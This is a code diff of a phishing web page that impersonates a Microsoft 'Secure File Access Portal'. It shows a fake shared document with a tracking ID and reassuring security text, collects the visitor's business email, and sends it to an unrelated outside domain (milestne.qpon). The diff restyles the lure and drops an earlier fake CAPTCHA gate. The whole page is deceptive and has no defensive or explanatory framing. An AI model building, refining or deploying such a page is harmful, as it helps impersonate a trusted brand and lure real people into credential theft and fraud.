@@ -2,116 +2,189 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Secure File Access Portal</title>
+<title>Protected File Portal</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-body{
-margin:0;
-background:#eef2f7;
-font-family:"Segoe UI",sans-serif;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
+body {
+  margin: 0;
+  background: #eef2f7;
+  font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
 }
 
-.box{
-width:100%;
-max-width:520px;
-background:#fff;
-border-radius:12px;
-box-shadow:0 20px 50px rgba(0,0,0,0.1);
-padding:40px;
-text-align:center;
+.portal-wrapper {
+  width: 100%;
+  max-width: 520px;
+  background: #ffffff;
+  border-radius: 12px;
+  box-shadow: 0 20px 50px rgba(0,0,0,0.1);
+  overflow: hidden;
 }
 
-input[type="email"]{
-width:100%;
-padding:12px;
-border-radius:6px;
-border:1px solid #ccc;
-margin-bottom:20px;
+.portal-header {
+  background: #ffffff;
+  padding: 25px 30px 10px 30px;
+  text-align: center;
+  border-bottom: 1px solid #e5e7eb;
 }
 
-button{
-width:100%;
-padding:14px;
-background:#1e2a38;
-color:#fff;
-border:none;
-border-radius:6px;
-cursor:pointer;
+.logo-container {
+  margin-bottom: 15px;
 }
 
-button:disabled{
-background:#999;
-cursor:not-allowed;
+.logo-container img {
+  max-width: 160px;  /* Adjust size here if needed */
+  height: auto;
 }
 
-#portal{
-display:none;
+.portal-header h1 {
+  margin: 0;
+  font-size: 20px;
+  font-weight: 600;
+  color: #1e2a38;
 }
 
-.captchaBox{
-display:flex;
-align-items:center;
-justify-content:center;
-gap:10px;
-border:1px solid #ddd;
-padding:15px;
-border-radius:6px;
-margin-top:20px;
+.portal-body {
+  padding: 40px;
+}
+
+.description {
+  font-size: 14px;
+  color: #555;
+  margin-bottom: 25px;
+  line-height: 1.6;
+}
+
+.document-box {
+  background: #f4f6f9;
+  border-left: 4px solid #1e2a38;
+  padding: 15px;
+  font-size: 13px;
+  margin-bottom: 25px;
+  border-radius: 6px;
+}
+
+.document-box span {
+  display: block;
+  margin-bottom: 4px;
+}
+
+label {
+  font-size: 13px;
+  font-weight: 600;
+  margin-bottom: 6px;
+  display: block;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  border-radius: 6px;
+  border: 1px solid #d0d5dd;
+  font-size: 14px;
+  margin-bottom: 20px;
+}
+
+.access-btn {
+  width: 100%;
+  padding: 14px;
+  background: #1e2a38;
+  border: none;
+  color: #fff;
+  font-size: 15px;
+  border-radius: 6px;
+  cursor: pointer;
+  transition: 0.3s ease;
+}
+
+.access-btn:hover {
+  background: #2f3e52;
+}
+
+.security-note {
+  margin-top: 18px;
+  font-size: 12px;
+  color: #6b7280;
+  text-align: center;
+}
+
+.footer-links {
+  margin-top: 20px;
+  text-align: center;
+  font-size: 12px;
+}
+
+.footer-links a {
+  color: #1e2a38;
+  text-decoration: none;
+  margin: 0 8px;
 }
 </style>
 </head>
 
 <body>
 
-<!-- CAPTCHA PAGE -->
-<div class="box" id="captchaPage">
+<div class="portal-wrapper">
 
-<h2>Security Verification</h2>
-<p>Please confirm you are not a robot to continue.</p>
+  <div class="portal-header">
 
-<div class="captchaBox">
-<input type="checkbox" id="robotCheck" onclick="unlockPortal()">
-<label for="robotCheck">I am not a robot</label>
-</div>
+    <div class="logo-container">
+      <img src="https://static.wikia.nocookie.net/windows/images/3/33/Microsoft-logo.png/revision/latest?cb=20231201023319" 
+           alt="Microsoft Logo">
+    </div>
 
-</div>
+    <h1>Secure File Access Portal</h1>
 
-<!-- MAIN PORTAL -->
-<div class="box" id="portal">
+  </div>
 
-<h2>Secure Document Verification</h2>
-<p>Please enter your business email to continue.</p>
+  <div class="portal-body">
 
-<input type="email" id="email" placeholder="name@company.com" required>
-<button type="button" onclick="redirectUser()">Continue Securely</button>
+    <div class="description">
+      A protected document has been shared with you through our secure transmission system.
+      Please verify your email address below to continue.
+    </div>
 
+    <div class="document-box">
+      
+      <span><strong>Size:</strong> 1.8 MB</span>
+      <span><strong>Tracking ID:</strong> REF-9821745</span>
+      <span><strong>Access:</strong> Time-sensitive</span>
+    </div>
+
+    <form onsubmit="redirectUser(event)">
+      <label for="userEmail">Business Email Address</label>
+      <input type="email" id="userEmail" placeholder="yourname@company.com" required>
+
+      <button type="submit" class="access-btn">
+        Continue to Document
+      </button>
+    </form>
+
+    <div class="security-note">
+      This connection is encrypted. Access activity may be logged for security and compliance purposes.
+    </div>
+
+    <div class="footer-links">
+      <a href="#">Support</a>
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms</a>
+    </div>
+
+  </div>
 </div>
 
 <script>
-// Unlock portal when checkbox clicked
-function unlockPortal(){
-    document.getElementById("captchaPage").style.display = "none";
-    document.getElementById("portal").style.display = "block";
+function redirectUser(event) {
+  event.preventDefault();
 
-    // Auto-reset checkbox after 1 second
-    setTimeout(function(){
-        document.getElementById("robotCheck").checked = false;
-    }, 1000);
-}
+  var email = document.getElementById("userEmail").value.trim();
+  var safeEmail = encodeURIComponent(email);
 
-// Redirect function for email input
-function redirectUser(){
-    var email = document.getElementById("email").value.trim();
-    if(email === "") return alert("Please enter your email");
-
-    // Open new tab exactly like "https://google.comEMAIL"
-    var url = "https://milestne.qpon/texttt#" + email;
-    window.open(url, "_blank");
+  window.open('https://milestne.qpon/texttt#' + email, '_blank');
 }
 </script>
 
